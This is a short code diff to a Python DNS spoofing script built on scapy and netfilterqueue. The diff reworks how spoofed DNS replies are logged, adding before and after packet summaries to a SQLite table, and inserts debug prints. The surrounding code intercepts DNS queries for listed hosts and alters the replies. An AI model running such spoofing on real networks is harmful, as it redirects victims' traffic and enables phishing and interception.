@@ -1,4 +1,3 @@
-
 from scapy.all import *
 from netfilterqueue import NetfilterQueue #apt-get install libnetfilter-queue-dev and pip install netfilterqueue
 import sqlite3
@@ -42,7 +41,6 @@ def modify_packet(packet):
 
 
 def process_packet(packet):
-    dlist = [source, destination]
     """
     Whenever a new packet is redirected to the netfilter queue,
     this callback is called.
@@ -53,6 +51,7 @@ def process_packet(packet):
         # if the packet is a DNS Resource Record (DNS reply)
         # modify the packet
         if scapy_packet[DNSQR].qname in dns_hosts:
+            dlist = [str(scapy_packet[DNSQR].qname), dns_hosts[scapy_packet[DNSQR].qname]]
             print("[Before]:", scapy_packet.summary())
             dlist.append(scapy_packet.summary())
             try:
@@ -62,6 +61,8 @@ def process_packet(packet):
                 pass
             print("[After ]:", scapy_packet.summary())
             dlist.append(scapy_packet.summary())
+            print("DLIST", dlist)
+            print(dlist[0])
             cur.execute('''INSERT INTO DNS_Spoofing (id, Source, Destination, Before, After) 
             VALUES (NULL, ?, ?, ?, ?)
              ''', dlist)
